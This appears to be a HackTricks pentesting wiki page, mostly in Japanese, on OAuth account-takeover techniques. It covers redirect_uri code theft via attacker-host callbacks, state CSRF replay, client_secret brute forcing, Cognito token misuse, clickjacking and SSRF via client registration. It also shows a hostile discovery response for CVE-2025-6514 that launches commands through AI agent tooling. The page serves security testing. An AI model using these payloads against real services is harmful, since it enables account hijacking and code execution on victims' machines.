# OAuth を使ったアカウント乗っ取り

{{#include ../banners/hacktricks-training.md}}

## 基本情報 <a href="#d4a8" id="d4a8"></a>

OAuth は複数のバージョンがあり、基本的な情報は [OAuth 2.0 documentation](https://oauth.net/2/) で確認できます。本節では主に広く使われている [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/) に焦点を当てます。これは、あるアプリケーションが別のアプリケーション（authorization server）にあるユーザーのアカウントに対してアクセスや操作を行うことを可能にする認可フレームワークです。

例として、あなたの全てのソーシャルメディア投稿（非公開投稿を含む）を表示することを目的とした仮想のサイト _https://example.com_ を考えます。これを実現するために OAuth 2.0 が利用されます。_https://example.com_ はあなたのソーシャルメディア投稿へのアクセス許可を求めます。すると、許可画面（consent screen）が _https://socialmedia.com_ 上に表示され、要求されている権限と要求を行っている開発者が示されます。あなたが許可すると、_https://example.com_ はあなたに代わってあなたの投稿にアクセスできるようになります。

OAuth 2.0 フレームワーク内で以下の構成要素を理解しておくことが重要です:

- **resource owner**: あなた。リソース（たとえばソーシャルメディアの投稿）へのアクセスを許可するユーザー／エンティティ。
- **resource server**: クライアントが `access token` を取得した後に認証済みリクエストを処理するサーバー（例: **https://socialmedia.com**）。
- **client application**: `resource owner` からの認可を求めるアプリケーション（例: **https://example.com**）。
- **authorization server**: `resource owner` の認証と認可を経て `client application` に `access tokens` を発行するサーバー（例: **https://socialmedia.com**）。
- **client_id**: アプリケーションの公開かつ一意な識別子。
- **client_secret:** アプリケーションと authorization server のみが知る秘密のキーで、`access_tokens` を発行する際に使用される。
- **response_type**: 要求するトークンの種類を指定する値（例: `code`）。
- **scope**: `client application` が `resource owner` に対して要求しているアクセスの範囲。
- **redirect_uri**: 認可後にユーザーがリダイレクトされる URL。通常は事前に登録されたリダイレクト URL と一致する必要がある。
- **state**: 認可サーバーへのリダイレクトの前後でデータを保持するためのパラメータ。CSRF 保護として機能させるために一意であることが重要。
- **grant_type**: どの種類の grant（および返されるトークンの種類）かを示すパラメータ。
- **code**: authorization server から発行される認可コード。クライアントはこれを `client_id` と `client_secret` と組み合わせて `access_token` を取得するために使用する。
- **access_token**: `client application` が `resource owner` に代わって API リクエストを行う際に使用するトークン。
- **refresh_token**: ユーザーに再度プロンプトを出すことなく、新しい `access_token` を取得するために使われる。

### フロー

実際の OAuth フローは次のように進行します:

1. あなたは [https://example.com](https://example.com) にアクセスし、「Integrate with Social Media」ボタンをクリックします。
2. サイトは次に https://example.com のアプリケーションがあなたの投稿へアクセスすることを許可するよう https://socialmedia.com に対してあなたの認可を求めるリクエストを送ります。リクエストは次のように構成されます:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. 次に同意ページが表示されます。
4. 承認後、ソーシャルメディアは`redirect_uri`に`code`と`state`パラメータを含むレスポンスを送信します:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com はこの `code` を、その `client_id` と `client_secret` とともに用いて、あなたに代わって `access_token` を取得するサーバー側リクエストを行い、あなたが同意した権限へのアクセスを可能にします:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Finally, the process concludes as https://example.com employs your `access_token` to make an API call to Social Media to access

## 脆弱性 <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), the authorization server must redirect the browser only to **事前登録された厳密な redirect URIs**。ここに弱点があると、攻撃者は被害者を悪意ある認可URLに誘導し、IdP が被害者の `code`（および `state`）を攻撃者のエンドポイントに直接渡してしまい、攻撃者がそれを交換してトークンを取得できます。

典型的な攻撃フロー:

1. `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` を作成して被害者に送る。
2. 被害者が認証し、スコープを承認する。
3. IdP が `attacker.tld/callback?code=<victim-code>&state=...` にリダイレクトし、攻撃者はリクエストを記録して直ちに code を交換する。

調査すべき一般的なバリデーション不具合:

- **No validation** – 任意の絶対URLが受け入れられ、即時に code が窃取される。
- **Weak substring/regex checks on the host** – `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, `match.com@evil.com` のような類似ドメインで回避される。
- **IDN homograph mismatches** – バリデーションは punycode 形式（`xn--`）で行われるが、ブラウザは攻撃者が管理する Unicode ドメインにリダイレクトする。
- **Arbitrary paths on an allowed host** – `redirect_uri` を `/openredirect?next=https://attacker.tld` や任意の XSS/user-content エンドポイントに向けると、連鎖リダイレクト、Referer ヘッダ、あるいは注入された JavaScript を通じて code が漏洩する。
- **Directory constraints without normalization** – `/oauth/*` のようなパターンは `/oauth/../anything` で回避され得る。
- **Wildcard subdomains** – `*.example.com` を受け入れると、（ダングリングDNS、S3バケット等の）任意の乗っ取りが即座に有効なコールバックとなる。
- **Non-HTTPS callbacks** – `http://` URI を許可すると、ネットワーク上の攻撃者（Wi‑Fi、企業プロキシ等）が転送中に code を盗む機会を与える。

また、補助的な redirect 系パラメータ（`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri` など）や OpenID discovery ドキュメント（`/.well-known/openid-configuration`）も確認し、同様のバリデーション不具合を継承している可能性のある追加エンドポイントを探してください。

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

このバグバウンティレポート [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html) にあるように、ユーザが認証した後にリダイレクト **URL がサーバのレスポンスに反映されている** 可能性があり、**XSS に対して脆弱** である場合があります。テスト用の可能なペイロード:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - `state` パラメータの不適切な取り扱い <a href="#bda5" id="bda5"></a>

`state` パラメータは Authorization Code フローにおける CSRF トークンです：クライアントはブラウザごとのインスタンスごとに**暗号学的にランダムな値**を生成し、そのブラウザだけが読める場所（cookie、local storage など）に保存し、認可リクエストで送信し、同じ値が返らないレスポンスは拒否する必要があります。値が静的、予測可能、任意、あるいはユーザのセッションに紐づいていない場合、攻撃者は自分の OAuth フローを完了して最終的な `?code=` リクエストをキャプチャ（送信せずに）し、後で被害者のブラウザを強制してそのリクエストをリプレイさせることで、被害者アカウントを攻撃者の IdP プロファイルに紐づけることができます。

リプレイパターンは常に同じです：

1. 攻撃者は自分のアカウントで IdP に認証し、`code`（および任意の `state`）を含む最後のリダイレクトを傍受します。
2. そのリクエストを破棄して URL を保持し、後で任意の CSRF プリミティブ（link、iframe、auto-submitting form）を悪用して被害者のブラウザに読み込ませます。
3. クライアントが `state` を検証しない場合、アプリケーションは攻撃者の認可結果を受け入れ、攻撃者を被害者のアプリアカウントにログインさせてしまいます。

テスト時の `state` 取り扱いに関する実務的チェックリスト：

- **`state` が完全に欠如している** – パラメータが全く現れない場合、ログイン全体が CSRF の対象になります。
- **`state` が必須ではない** – 初期リクエストから削除してみて、IdP がそれでもコードを発行しクライアントが受け入れるなら、防御はオプトインになっています。
- **返却される `state` が検証されない** – レスポンス内の値を改竄してみて（Burp、MITM proxy 等）。不一致の値を受け入れる場合、保存されたトークンが比較されていないことを意味します。
- **予測可能または純粋にデータ駆動型の `state`** – 多くのアプリはリダイレクトパスや JSON ブロブをランダム性を混ぜずに `state` に詰め込み、攻撃者が有効な値を推測してフローをリプレイできるようにしています。データをエンコードする前に必ず強力なエントロピーを前後に付加してください。
- **`state` 固定化** – アプリがユーザーに `state` 値を供給させ（例：細工した authorization URL 経由）フロー全体で再利用する場合、攻撃者は既知の値を固定して被害者間で再利用できます。

PKCE は（特に public clients に対して）authorization code を code verifier に結び付けることで `state` を補完できますが、web クライアントはクロスユーザーの CSRF／アカウント連携バグを防ぐために引き続き `state` を追跡する必要があります。

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **アカウント作成時のメール確認がない場合**：攻撃者は被害者のメールアドレスを使って事前にアカウントを作成できます。被害者が後でサードパーティサービスでログインした場合、アプリケーションは誤ってそのサードパーティアカウントを攻撃者の事前作成アカウントに紐づけてしまい、不正アクセスにつながる可能性があります。
2. **緩い OAuth のメール確認の悪用**：攻撃者はメールを確認しない OAuth サービスを悪用して自ら登録し、その後アカウントのメールを被害者のものに変更することができます。この方法も最初のシナリオと同様に不正アクセスのリスクがあり、別の攻撃ベクトルを通じて発生します。

### Disclosure of Secrets <a href="#e177" id="e177"></a>

`client_id` は意図的に公開されていますが、**`client_secret` はエンドユーザーが回復できてはなりません**。`client_secret` を **mobile APKs、desktop clients、single-page apps** に埋め込むような Authorization Code のデプロイは、そのパッケージをダウンロードできる誰にでも資格情報を渡しているのと同義です。public clients を調査する際は必ず次を確認してください：

- APK/IPA、デスクトップインストーラ、または Electron アプリを展開し、`client_secret`、JSON にデコードされるような Base64 ブロブ、またはハードコードされた OAuth エンドポイントを grep する。
- 同梱された設定ファイル（plist、JSON、XML）や逆コンパイルした文字列をレビューしてクライアント資格情報を探す。

攻撃者が秘密を抽出すると、弱い `redirect_uri`、ログなどを介して任意の被害者の認可 `code` を盗むだけで、正規のアプリを介さずに `/token` を叩いて access/refresh トークンを発行できます。public/native クライアントは **秘密を保持できないものとみなす**べきで、静的な secret の代わりにインスタンスごとの code verifier の所持を証明するために PKCE (RFC 7636) に依存するべきです。テスト中は PKCE が必須かどうか、バックエンドが `client_secret` **または** 有効な `code_verifier` のいずれかを欠くトークン交換を実際に拒否するかどうかを確認してください。

### Client Secret Bruteforce

サービスプロバイダの `client_secret` を IdP に対して**ブルートフォース**してアカウントを盗もうと試みることができます。\
ブルートフォースのリクエストは概ね次のように見える場合があります：
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer/Header/Location アーティファクトが Code + State を leak する

クライアントが **code and state** を持っていて、それらが **`location.href`** や **`document.referrer`** に現れ、サードパーティへ転送されると leak する。よく見られるパターンは二つ：

- **Classic Referer leak**: OAuth リダイレクト後、URL に `?code=&state=` が残るようなナビゲーションは、CDNs/analytics/ads に送信される **Referer** ヘッダ内にそれらを押し込む。
- **Telemetry/analytics confused deputy**: 一部の SDK（pixels/JS loggers）は `postMessage` イベントに反応し、**メッセージで渡された token を使って現在の `location.href`/`referrer` を backend APIs に送る**ことがある。攻撃者制御下の postMessage リレー等で自分の token をそのフローに注入できれば、後で SDK の API リクエスト履歴／ログを読み、そこに埋め込まれた被害者の OAuth アーティファクトを回収できる。

### Access Token Stored in Browser History

Authorization Code grant のコア保証は、**access tokens がリソース所有者のブラウザに届かないこと**だ。実装がクライアント側で token を leak すると、どんな小さなバグ（XSS、Referer leak、プロキシのログ）でも即座にアカウント乗っ取りにつながる。必ずチェックすること：

- **Tokens in URLs** – `access_token` がクエリ／フラグメントに出ると、ブラウザ履歴、サーバーログ、analytics、サードパーティに送られる Referer ヘッダに残る。
- **Tokens transiting untrusted middleboxes** – HTTP 経由やデバッグ／企業プロキシ経由で token を返すとネットワーク監視者が直接キャプチャできる。
- **Tokens stored in JavaScript state** – React/Vue の store、グローバル変数、シリアライズされた JSON ブロブはオリジン上の全スクリプト（XSS ペイロードや悪意ある拡張機能を含む）に token を露出する。
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` は共有端末でログアウト後も token を保持し、スクリプトからアクセス可能である。

これらのいずれかの発見は通常、CSP bypass や DOM XSS のような「低」評価のバグを、単に漏えいした bearer token を読み取り再利用できるために完全な API takeover に格上げする。

### Everlasting Authorization Code

Authorization codes は **短時間、有効一回、replay に対処**すべきだ。フローを評価する際は `code` をキャプチャして以下を試す：

- **Test the lifetime** – RFC 6749 は数分を推奨しており、数時間は長すぎる。5–10 分後にコードを redeem してみてまだ有効なら、漏洩時の露出ウィンドウが過度に長い。
- **Test sequential reuse** – 同じ `code` を二度送る。二回目で別の token が発行されるなら、攻撃者はセッションを無期限にクローンできる。
- **Test concurrent redemption/race conditions** – 並列で二つの token リクエストを発射する（Burp intruder、turbo intruder 等）。弱い発行者は両方に付与することがある。
- **Observe replay handling** – 再利用試行は単に失敗するだけでなく、そのコードから既に発行された token を取り消すべきだ。そうでないと、replay を検出しても攻撃者の最初の token が有効なまま残る。

replay に寛容なコードと任意の `redirect_uri` やログ記録のバグを組み合わせると、被害者が正規ログインを完了した後でも持続的にアカウントへアクセスできてしまう。

### Authorization/Refresh Token not bound to client

もし **authorization code** を取得してそれを別の client/app に対して redeem できるなら、他人のアカウントを takeover できる。弱いバインディングかを試すには：

- **app A** 用にキャプチャした `code` を **app B’s token endpoint** に送る；それでも token を受け取れるなら audience binding は破綻している。
- 本来自分の client ID に限定されるはずの first-party token minting endpoints を試す；もし code の検証だけで任意の `state`/`app_id` を受け入れるなら、実質的に **authorization-code swap** を行ってより権限の高い first-party token を発行できる。
- client binding が nonce/redirect URI の不一致を無視するか確認する。エラーページがまだ `location.href` をログする SDK を読み込む場合は、Referer/telemetry leaks と組み合わせてコードを盗み、他所で redeem できる。

`code` → token を交換するあらゆるエンドポイントは、発行した client、redirect URI、nonce を検証しなければならない。そうでないと、どのアプリから盗まれた code でも first-party access token にアップグレードされてしまう。

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

このバグバウンティ報告: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) では、ユーザーに返される **token** がユーザーデータを書き換えるのに十分な権限を持っている場合があることが示されている。したがって、別のユーザーのメールアドレスにユーザーのメールを **change** できれば、他のアカウントを **take over** できる可能性がある。
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### 他のアプリのトークンの悪用 <a href="#bda5" id="bda5"></a>

As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth フローで **token**（code ではなく）を受け取ることを想定している場合、受け取った token がそのアプリに帰属するかをチェックしないと脆弱になり得ます。

これは、**attacker** が自分のアプリに **application supporting OAuth and login with Facebook**（例）を作成できるためです。被害者がその **attackers application** で Facebook に login すると、attacker はその application に与えられたユーザーの **OAuth token** を取得し、それを使って victim の OAuth application に対して victim の user token で login できる可能性があります。

> [!CAUTION]
> したがって、もし attacker がユーザーを自分の OAuth application にアクセスさせることに成功すれば、token を期待していてその token が自分の app ID に与えられたものかどうかを確認していないアプリケーションでは victim のアカウントを乗っ取ることが可能になります。

### Two links & cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), 被害者に **returnUrl** を attackers host を指すページを開かせることが可能でした。この情報は cookie（RU）に保存され、後のステップで **prompt** が **user** に attackers host へのアクセスを許可するかを尋ねます。

この prompt を回避するために、returnUrl を使って RU cookie を設定する OAuth flow を開始するタブを開き、prompt が表示される前にそのタブを閉じて、その値のない新しいタブを開くという手法がありました。すると、prompt は attackers host について通知しませんが、cookie は設定されたままになるため、リダイレクト時に token が attackers host に送信されます。

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), 一部の OAuth 実装では GET パラメータ `prompt` を None（`&prompt=none`）に指定して、ユーザーが既にプラットフォームにログインしている場合にウェブ上の prompt でアクセス確認を求められないようにできる場合があります。

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), パラメータ **`response_mode`** を指定して、最終的な URL のどこに code を提供してほしいかを指定できる場合があります:

- `response_mode=query` -> コードは GET パラメータ内に提供されます: `?code=2397rf3gu93f`
- `response_mode=fragment` -> コードは URL のフラグメント `#code=2397rf3gu93f` 内に提供されます
- `response_mode=form_post` -> コードは `code` という名前の input を含む POST フォームの値として提供されます
- `response_mode=web_message` -> コードは postMessage で送られます: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth の同意/ログインダイアログは clickjacking の格好のターゲットです: フレーム化できる場合、attacker はカスタムのグラフィックを重ね、実ボタンを隠し、ユーザーをだまして危険なスコープを承認させたりアカウントをリンクさせたりできます。PoC を作る際は以下を試してください:

1. IdP の authorization URL を `<iframe sandbox="allow-forms allow-scripts allow-same-origin">` 内に読み込む。
2. 絶対位置指定や不透明度のトリックを使って、偽のボタンを隠れた **Allow**/**Approve** コントロールに重ね合わせる。
3. オプションでパラメータ（scopes、redirect URI 等）を事前に設定しておき、窃取した承認が即座に attacker に利益をもたらすようにする。

テスト時には IdP ページが `X-Frame-Options: DENY/SAMEORIGIN` のいずれか、または制限的な `Content-Security-Policy: frame-ancestors 'none'` を返しているかを確認してください。どちらも存在しない場合は、[NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) のようなツールでリスクを実証し、victim がどれだけ簡単に attacker のアプリを承認してしまうかを記録してください。追加のペイロード案については [Clickjacking](clickjacking.md) を参照してください。

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), これは username と password で OAuth に login できる OAuth フローです。もしこの単純なフローで、ユーザーが実行できるすべての操作にアクセスできる token が返されると、その token を使って 2FA をバイパスすることが可能になります。

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) は、open redirect を referrer の値に基づいて利用することで OAuth を悪用して ATO を引き起こす方法について解説しています。攻撃の流れは以下のとおりです:

1. Victim が attackers の web page にアクセスする
2. Victim が悪意あるリンクを開き、opener が `response_type=id_token,code&prompt=none` を追加パラメータとして付与して Google OAuth フローを開始する（referrer は attackers website）
3. opener 内で provider が victim を承認した後、`redirect_uri` パラメータの値（victim web）に 30X のコードで戻し、その際 referer は依然として attackers website のままになる
4. victim の website が referrer に基づいて open redirect をトリガーし、victim を attackers website にリダイレクトする。`respose_type` が `id_token,code` であったため、code は URL のフラグメントとして attacker に返送され、attacker は victim のサイト上で Google 経由でアカウントを乗っ取ることができる

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

OAuth における Dynamic Client Registration は、一見目立たないが重大な脆弱性ベクター、特に **SSRF** 攻撃に繋がる場合があります。このエンドポイントは OAuth サーバが client application に関する詳細（攻撃者が悪用可能な機密性の高い URL を含む）を受け取るために使われます。

主なポイント:

- **Dynamic Client Registration** は通常 `/register` にマッピングされ、`client_name`、`client_secret`、`redirect_uris`、ロゴや JSON Web Key Set（JWKs）用の URL などを POST で受け取ります。
- この機能は **RFC7591** および **OpenID Connect Registration 1.0** に準拠しており、SSRF に繋がり得るパラメータが含まれます。
- 登録プロセスは以下のような形でサーバを SSRF に晒す可能性があります:
  - **`logo_uri`**: クライアントアプリのロゴ用 URL。サーバがこの URL を取得する際に SSRF を引き起こしたり、URL の取り扱いを誤ると XSS を招く可能性があります。
  - **`jwks_uri`**: クライアントの JWK ドキュメントへの URL。悪意のある構成の場合、サーバが攻撃者制御下のサーバにアウトバウンドリクエストを行う可能性があります。
  - **`sector_identifier_uri`**: `redirect_uris` の JSON 配列を参照する URI。サーバがこれをフェッチすることで SSRF の機会が生じます。
  - **`request_uris`**: クライアントの許可された request URI の一覧。サーバが認可プロセスの開始時にこれらをフェッチする実装であれば悪用され得ます。
- `request_uris` を経由した直接的な悪用はホワイトリスト等で緩和されている場合がありますが、事前に登録された attacker 制御下の `request_uri` を指定することで認可フェーズ中に SSRF を引き起こすことができます。

Exploitation Strategy:

- `logo_uri`、`jwks_uri`、`sector_identifier_uri` のようなパラメータに悪意ある URL を登録して新しい client を登録することで SSRF を誘発できます。
- `request_uris` 経由の直接的な悪用が制限されている場合でも、事前登録された attacker 管理の `request_uri` を提供することで、認可の過程で SSRF を引き起こす足がかりにできます。

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Research on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/)（Claude Desktop、Cursor、Windsurf といった `mcp-remote` クライアントに影響）では、クライアントが IdP メタデータをそのままオペレーティングシステムに渡す場合、dynamic OAuth discovery が RCE の原始（primitive）になり得ることが示されています。リモート MCP サーバは discovery 交換（`/.well-known/openid-configuration` や任意のメタデータ RPC）中に攻撃者制御下の `authorization_endpoint` を返します。`mcp-remote ≤0.1.15` はその後受け取った文字列をシステムの URL ハンドラ（`start`、`open`、`xdg-open` など）に渡してしまい、OS がサポートする任意の scheme/path がローカルで実行されてしまいます。

Attack workflow

1. desktop agent を hostile MCP/OAuth サーバに向ける（`npx mcp-remote https://evil`）。agent は `401` と共にメタデータを受け取る。
2. サーバは以下のような JSON で応答する:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. The client launches the OS handler for the supplied URI. Windows accepts payloads like `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux accept `file:///Applications/Calculator.app/...` or even custom schemes such as `cmd://bash -lc '<payload>'` if registered.
4. Because this happens before any user interaction, **merely configuring the client to talk to the attacker server yields code execution**.

**How to test**

- Target any OAuth-capable desktop/agent that performs discovery over HTTP(S) and opens returned endpoints locally (Electron apps, CLI helpers, thick clients).
- Intercept or host the discovery response and replace `authorization_endpoint`, `device_authorization_endpoint`, or similar fields with `file://`, `cmd://`, UNC paths, or other dangerous schemes.
- Observe whether the client validates the scheme/host. Lack of validation results in immediate execution under the user context and proves the issue.
- Repeat with different schemes to map the full attack surface (e.g., `ms-excel:`, `data:text/html,`, custom protocol handlers) and demonstrate cross-platform reach.

## OAuth providers レースコンディション

If the platform you are testing is an OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

In OAuth, the sub field uniquely identifies a user, but its format varies by Authorization Server. To standardize user identification, some clients use emails or user handles. However, this is risky because:

- Some Authorization Servers do not ensure that these properties (like email) remain immutable.
- In certain implementations—such as **"Login with Microsoft"**—the client relies on the email field, which is **user-controlled by the user in Entra ID** and not verified.
- An attacker can exploit this by creating their own Azure AD organization (e.g., doyensectestorg) and using it to perform a Microsoft login.
- Even though the Object ID (stored in sub) is immutable and secure, the reliance on a mutable email field can enable an account takeover (for example, hijacking an account like victim@gmail.com).

## Client Confusion Attack

In a **Client Confusion Attack**, an application using the OAuth Implicit Flow fails to verify that the final access token is specifically generated for its own Client ID. An attacker sets up a public website that uses Google’s OAuth Implicit Flow, tricking thousands of users into logging in and thereby harvesting access tokens intended for the attacker’s site. If these users also have accounts on another vulnerable website that does not validate the token's Client ID, the attacker can reuse the harvested tokens to impersonate the victims and take over their accounts.

## Scope Upgrade Attack

The **Authorization Code Grant** type involves secure server-to-server communication for transmitting user data. However, if the **Authorization Server** implicitly trusts a scope parameter in the Access Token Request (a parameter not defined in the RFC), a malicious application could upgrade the privileges of an authorization code by requesting a higher scope. After the **Access Token** is generated, the **Resource Server** must verify it: for JWT tokens, this involves checking the JWT signature and extracting data such as client_id and scope, while for random string tokens, the server must query the Authorization Server to retrieve the token’s details.

## Redirect Scheme Hijacking

In mobile OAuth implementations, apps use **custom URI schemes** to receive redirects with Authorization Codes. However, because multiple apps can register the same scheme on a device, the assumption that only the legitimate client controls the redirect URI is violated. On Android, for instance, an Intent URI like `com.example.app://` oauth is caught based on the scheme and optional filters defined in an app’s intent-filter. Since Android’s intent resolution can be broad—especially if only the scheme is specified—an attacker can register a malicious app with a carefully crafted intent filter to hijack the authorization code. This can **enable an account takeover** either through user interaction (when multiple apps are eligible to handle the intent) or via bypass techniques that exploit overly specific filters, as detailed by Ostorlab's assessment flowchart.



## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)

{{#include ../banners/hacktricks-training.md}}
